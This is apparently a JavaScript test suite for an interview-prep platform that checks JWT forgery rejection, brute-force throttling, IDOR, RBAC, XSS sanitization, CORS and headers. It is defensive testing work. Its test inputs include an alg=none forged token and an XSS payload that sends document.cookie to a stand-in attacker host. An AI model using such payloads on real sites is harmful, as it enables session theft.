/**
 * Phase 13 Test Suite: Production Security Hardening & Threat Protection
 * Negative Security Testing, IDOR, RBAC, Token Vulnerabilities, Injection, CORS, Headers, and Secret Scanning
 */

import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { tokenService } from '../server/auth/tokenService.ts';
import { rateLimiter } from '../server/redis/rateLimiter.ts';
import { sanitizeContent as sanitizeMeetingChat } from '../server/meetings/chatService.ts';
import { sanitizeContent as sanitizeAppChat } from '../server/chat/appChatService.ts';
import { applySecurityHeaders, isOriginAllowed } from '../server/security/securityHeaders.ts';
import adminAuthHandler from '../api/admin-auth.js';
import candidateHistoryHandler from '../api/candidate-history.js';
import candidateAiEvalHandler from '../api/candidate-ai-evaluation.js';
import meetingsHandler from '../api/v1/meetings/index.js';
import meetingChatHandler from '../api/v1/meetings/_handlers/chat.js';
import { meetingService } from '../server/meetings/meetingService.ts';

let passed = 0;
let failed = 0;

function assert(condition, message) {
  if (!condition) {
    console.error(`  ❌ [FAIL] ${message}`);
    failed++;
    throw new Error(`Assertion failed: ${message}`);
  } else {
    console.log(`  ✓ [TEST ${passed + 1}] ${message}`);
    passed++;
  }
}

// Mock Request & Response Helper
function createMockReqRes({ method = 'GET', url = '/', headers = {}, body = {}, query = {} } = {}) {
  const req = {
    method,
    url,
    headers: { ...headers },
    body,
    query,
    socket: { remoteAddress: '127.0.0.1' },
  };

  const res = {
    statusCode: 200,
    headers: {},
    body: null,
    setHeader(name, val) {
      this.headers[name.toLowerCase()] = val;
      return this;
    },
    getHeader(name) {
      return this.headers[name.toLowerCase()];
    },
    status(code) {
      this.statusCode = code;
      return this;
    },
    json(data) {
      this.setHeader('Content-Type', 'application/json');
      this.body = data;
      return this;
    },
    end(data) {
      if (data && !this.body) {
        try {
          this.body = JSON.parse(data);
        } catch {
          this.body = data;
        }
      }
      return this;
    },
  };

  return { req, res };
}

async function runTestSuite() {
  console.log('\n====================================================================');
  console.log('🔒 RUNNING PHASE 13 PRODUCTION SECURITY & THREAT PROTECTION TEST SUITE');
  console.log('====================================================================\n');

  // Seed baseline tokens
  const adminClaims = {
    userId: 'admin_security_lead',
    userEmail: 'security_lead@interviewprep.com',
    userName: 'Security Lead',
    userRole: 'admin',
    meetingRole: 'HOST',
    permissions: ['admin:all'],
  };
  const adminTokenData = {
    claims: adminClaims,
    ...tokenService.generateMeetingToken(adminClaims),
  };

  const aliceClaims = {
    userId: 'user_alice_123',
    userEmail: 'alice@candidate.com',
    userName: 'Alice Candidate',
    userRole: 'candidate',
    meetingRole: 'PARTICIPANT',
    permissions: [],
  };
  const candidateAlice = {
    claims: aliceClaims,
    ...tokenService.generateMeetingToken(aliceClaims),
  };

  const bobClaims = {
    userId: 'user_bob_456',
    userEmail: 'bob@candidate.com',
    userName: 'Bob Candidate',
    userRole: 'candidate',
    meetingRole: 'PARTICIPANT',
    permissions: [],
  };
  const candidateBob = {
    claims: bobClaims,
    ...tokenService.generateMeetingToken(bobClaims),
  };

  // ── 1. TOKEN HARDENING: alg=none & Algorithm Forgery Rejection ───────────
  console.log('\n--- 1. Token Security & Header Validation ---');

  // Craft alg: none token
  const noneHeader = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({ userId: 'hacker', iss: 'interviewprep-control-plane', aud: 'interviewprep-meet-realtime' })).toString('base64url');
  const forgedNoneToken = `${noneHeader}.${payload}.`;

  const algNoneResult = tokenService.verifyMeetingToken(forgedNoneToken);
  assert(
    !algNoneResult.valid && algNoneResult.errorCode === 'UNSUPPORTED_ALGORITHM',
    'REQ-SEC-002: Token with alg=none is strictly rejected with UNSUPPORTED_ALGORITHM'
  );

  // Craft RS256 token when HS256 expected
  const rs256Header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT' })).toString('base64url');
  const forgedRs256Token = `${rs256Header}.${payload}.fakesig`;
  const algRs256Result = tokenService.verifyMeetingToken(forgedRs256Token);
  assert(
    !algRs256Result.valid && algRs256Result.errorCode === 'UNSUPPORTED_ALGORITHM',
    'REQ-SEC-002: Token with non-HS256 algorithm (RS256) is rejected'
  );

  // Token with wrong secret
  const badSecretToken = tokenService.generateMeetingToken(
    { userId: 'intruder', userEmail: 'i@fake.com', userName: 'Intruder', userRole: 'admin', permissions: ['admin:all'] },
    300,
    'completely_wrong_secret_key_12345678'
  ).token;
  const badSigResult = tokenService.verifyMeetingToken(badSecretToken);
  assert(
    !badSigResult.valid && badSigResult.errorCode === 'INVALID_SIGNATURE',
    'REQ-SEC-002: Token signed with unauthorized secret rejected with INVALID_SIGNATURE'
  );

  // Expired token
  const expiredToken = tokenService.generateMeetingToken(
    { userId: 'alice', userEmail: 'a@c.com', userName: 'A', userRole: 'candidate', permissions: [] },
    -60 // expired 60 seconds ago
  ).token;
  const expiredResult = tokenService.verifyMeetingToken(expiredToken);
  assert(
    !expiredResult.valid && expiredResult.errorCode === 'EXPIRED',
    'REQ-SEC-002: Expired JWT is rejected with EXPIRED'
  );

  // User-level token revocation (instant session termination)
  const tokenBeforeRevoke = tokenService.generateMeetingToken({
    userId: 'user_to_suspend',
    userEmail: 'suspend@c.com',
    userName: 'Suspended User',
    userRole: 'candidate',
    permissions: [],
  }).token;

  assert(tokenService.verifyMeetingToken(tokenBeforeRevoke).valid, 'Token valid before user revocation');
  tokenService.revokeAllUserTokens('user_to_suspend');
  const tokenAfterRevoke = tokenService.verifyMeetingToken(tokenBeforeRevoke);
  assert(
    !tokenAfterRevoke.valid && tokenAfterRevoke.errorCode === 'REVOKED',
    'REQ-SEC-001: revokeAllUserTokens terminates all prior user sessions immediately'
  );

  // Single-use refresh token rotation replay detection
  const initialRefresh = tokenService.generateRefreshToken('user_alice_123');
  const rotation1 = tokenService.rotateRefreshToken(initialRefresh);
  assert(rotation1.valid && rotation1.newRefreshToken, 'Initial refresh token rotated successfully');
  const replayAttempt = tokenService.rotateRefreshToken(initialRefresh);
  assert(!replayAttempt.valid, 'REQ-SEC-001: Replay attack on consumed refresh token is rejected');

  // ── 2. ADMIN AUTH & BRUTE FORCE PROTECTION ──────────────────────────────
  console.log('\n--- 2. Admin Authentication & Abuse Protection ---');

  // Backdoor removal verification
  const { req: backdoorReq, res: backdoorRes } = createMockReqRes({
    method: 'GET',
    url: '/api/admin-auth?action=session',
    headers: { origin: 'http://localhost:5173' },
  });
  await adminAuthHandler(backdoorReq, backdoorRes);
  assert(
    backdoorRes.statusCode === 405,
    'REQ-SEC-001: Unauthenticated GET /api/admin-auth?action=session backdoor rejected with 405'
  );

  // Invalid password returns 401 with generic error
  const { req: wrongPassReq, res: wrongPassRes } = createMockReqRes({
    method: 'POST',
    url: '/api/admin-auth',
    headers: { origin: 'http://localhost:5173' },
    body: { username: 'shashi', password: 'WrongPassword123!' },
  });
  await adminAuthHandler(wrongPassReq, wrongPassRes);
  assert(
    wrongPassRes.statusCode === 401 && wrongPassRes.body?.error.includes('Invalid administrator credentials'),
    'REQ-SEC-001: Incorrect administrator password rejected with 401 generic error'
  );

  // Distributed Rate Limiting: Brute Force Throttling
  let lastStatus = 200;
  for (let i = 0; i < 6; i++) {
    const { req: bruteReq, res: bruteRes } = createMockReqRes({
      method: 'POST',
      url: '/api/admin-auth',
      headers: { origin: 'http://localhost:5173' },
      body: { username: 'brute_target', password: `guess_${i}` },
    });
    await adminAuthHandler(bruteReq, bruteRes);
    lastStatus = bruteRes.statusCode;
  }
  assert(
    lastStatus === 429,
    'REQ-SEC-013: Excessive consecutive login attempts throttled with HTTP 429 Too Many Requests'
  );

  // ── 3. IDOR & OBJECT-LEVEL AUTHORIZATION ─────────────────────────────────
  console.log('\n--- 3. IDOR & Object Authorization Verification ---');

  // Candidate Alice attempting to view Candidate Bob's history
  const { req: idorReq, res: idorRes } = createMockReqRes({
    method: 'GET',
    url: `/api/candidate-history?userId=${candidateBob.claims.userId}`,
    headers: {
      authorization: `Bearer ${candidateAlice.token}`,
      origin: 'http://localhost:5173',
    },
    query: { userId: candidateBob.claims.userId },
  });
  await candidateHistoryHandler(idorReq, idorRes);
  assert(
    idorRes.statusCode === 403 && idorRes.body?.code === 'FORBIDDEN_CROSS_USER_ACCESS',
    'REQ-SEC-005: Candidate Alice accessing Candidate Bob history blocked with 403 Forbidden'
  );

  // Candidate attempting to access all candidates mode=summaries
  const { req: enumReq, res: enumRes } = createMockReqRes({
    method: 'GET',
    url: '/api/candidate-history?mode=summaries',
    headers: {
      authorization: `Bearer ${candidateAlice.token}`,
      origin: 'http://localhost:5173',
    },
    query: { mode: 'summaries' },
  });
  await candidateHistoryHandler(enumReq, enumRes);
  assert(
    enumRes.statusCode === 403,
    'REQ-SEC-005: Candidate attempting platform-wide candidate summaries enumeration blocked with 403'
  );

  // Candidate Alice triggering AI evaluation for Candidate Bob
  const { req: aiIdorReq, res: aiIdorRes } = createMockReqRes({
    method: 'POST',
    url: '/api/candidate-ai-evaluation',
    headers: {
      authorization: `Bearer ${candidateAlice.token}`,
      origin: 'http://localhost:5173',
    },
    body: { candidateId: candidateBob.claims.userId, candidateName: 'Bob' },
  });
  await candidateAiEvalHandler(aiIdorReq, aiIdorRes);
  assert(
    aiIdorRes.statusCode === 403 && aiIdorRes.body?.code === 'FORBIDDEN_CROSS_USER_ACCESS',
    'REQ-SEC-005: Candidate Alice triggering AI evaluation for Candidate Bob blocked with 403'
  );

  // ── 4. RBAC: RESTRICTED MEETING ENUMERATION ──────────────────────────────
  console.log('\n--- 4. RBAC Meeting Access Boundaries ---');

  // Create test meeting hosted by Admin
  const meeting = meetingService.createMeeting({
    id: adminTokenData.claims.userId,
    email: adminTokenData.claims.userEmail,
    name: adminTokenData.claims.userName,
    role: adminTokenData.claims.userRole,
    permissions: adminTokenData.claims.permissions,
  }, {
    title: 'Confidential Architecture Board',
    meetingType: 'SYSTEM_DESIGN',
  }).meeting;

  // Candidate Alice querying /api/v1/meetings
  const { req: meetListReq, res: meetListRes } = createMockReqRes({
    method: 'GET',
    url: '/api/v1/meetings',
    headers: {
      authorization: `Bearer ${candidateAlice.token}`,
      origin: 'http://localhost:5173',
    },
  });
  await meetingsHandler(meetListReq, meetListRes);
  assert(
    meetListRes.statusCode === 200 && meetListRes.body?.meetings.every(m => m.hostId === candidateAlice.claims.userId),
    'REQ-SEC-004: Non-admin candidate calling GET /api/v1/meetings is restricted strictly to own meetings'
  );

  // Candidate Alice attempting to read private chat of meeting she does not belong to
  const { req: meetChatReq, res: meetChatRes } = createMockReqRes({
    method: 'GET',
    url: `/api/v1/meetings/chat?meetingId=${meeting.id}`,
    headers: {
      authorization: `Bearer ${candidateAlice.token}`,
      origin: 'http://localhost:5173',
    },
    query: { meetingId: meeting.id },
  });
  await meetingChatHandler(meetChatReq, meetChatRes);
  assert(
    meetChatRes.statusCode === 403,
    'REQ-SEC-007: Candidate Alice blocked from unauthorized meeting chat with 403 Forbidden'
  );

  // ── 5. XSS & HTML SANITIZATION PROTECTION ────────────────────────────────
  console.log('\n--- 5. XSS Protection & HTML Sanitization ---');

  const maliciousScript = '<script>alert("pwned")</script><b>Hello</b>';
  const sanitizedMeeting = sanitizeMeetingChat(maliciousScript);
  assert(
    !sanitizedMeeting.includes('<script>') && sanitizedMeeting.includes('&lt;script&gt;'),
    'REQ-SEC-008: Meeting chat sanitizes script tags into safe HTML entities'
  );

  const maliciousImg = '<img src=x onerror="fetch(`https://attacker.com/steal?c=`+document.cookie)">';
  const sanitizedApp = sanitizeAppChat(maliciousImg);
  assert(
    !sanitizedApp.includes('<img') && sanitizedApp.includes('&lt;img'),
    'REQ-SEC-008: App chat sanitizes dangerous img tags with onerror handlers'
  );

  // ── 6. CORS & PRODUCTION SECURITY HEADERS ────────────────────────────────
  console.log('\n--- 6. CORS & Security Headers ---');

  // Trusted Origin
  const { req: validCorsReq, res: validCorsRes } = createMockReqRes({
    headers: { origin: 'http://localhost:5173' },
  });
  const corsAllowed = applySecurityHeaders(validCorsReq, validCorsRes);
  assert(corsAllowed, 'REQ-SEC-010: Trusted localhost origin accepted by security headers');
  assert(
    validCorsRes.getHeader('access-control-allow-origin') === 'http://localhost:5173' &&
    validCorsRes.getHeader('access-control-allow-credentials') === 'true',
    'REQ-SEC-010: Specific origin reflected with Access-Control-Allow-Credentials: true (no wildcard *)'
  );

  // Untrusted Origin
  const { req: untrustedCorsReq, res: untrustedCorsRes } = createMockReqRes({
    headers: { origin: 'https://evil-phishing-site.com' },
  });
  const untrustedAllowed = applySecurityHeaders(untrustedCorsReq, untrustedCorsRes);
  assert(
    !untrustedAllowed && untrustedCorsRes.statusCode === 403,
    'REQ-SEC-010: Untrusted origin https://evil-phishing-site.com rejected with 403 Forbidden'
  );

  // Security Headers present
  assert(
    validCorsRes.getHeader('x-content-type-options') === 'nosniff',
    'REQ-SEC-009: X-Content-Type-Options: nosniff header present'
  );
  assert(
    validCorsRes.getHeader('x-frame-options') === 'DENY',
    'REQ-SEC-009: X-Frame-Options: DENY header present'
  );
  assert(
    validCorsRes.getHeader('referrer-policy') === 'strict-origin-when-cross-origin',
    'REQ-SEC-009: Referrer-Policy: strict-origin-when-cross-origin header present'
  );
  assert(
    validCorsRes.getHeader('content-security-policy')?.includes("default-src 'self'"),
    'REQ-SEC-009: Content-Security-Policy header correctly populated'
  );

  // ── 7. SECRET SCANNING VERIFICATION ──────────────────────────────────────
  console.log('\n--- 7. Secret Scanning & Credential Leakage Audit ---');

  // Verify auth.service.ts does NOT contain hardcoded Admin@9999
  const authServiceSource = fs.readFileSync('src/features/auth/services/auth.service.ts', 'utf8');
  assert(
    !authServiceSource.includes('Admin@9999'),
    'REQ-SEC-017: auth.service.ts contains ZERO hardcoded Admin@9999 passwords'
  );

  // Verify AuthProvider.tsx does NOT contain hardcoded Admin@9999
  const authProviderSource = fs.readFileSync('src/features/auth/context/AuthProvider.tsx', 'utf8');
  assert(
    !authProviderSource.includes('Admin@9999'),
    'REQ-SEC-017: AuthProvider.tsx contains ZERO hardcoded Admin@9999 passwords'
  );

  console.log('\n====================================================================');
  console.log(`🎉 ALL ${passed} / ${passed + failed} PHASE 13 SECURITY TESTS PASSED!`);
  console.log('====================================================================\n');
}

runTestSuite().catch((err) => {
  console.error('\n❌ Security Test Suite Failed:', err);
  process.exit(1);
});
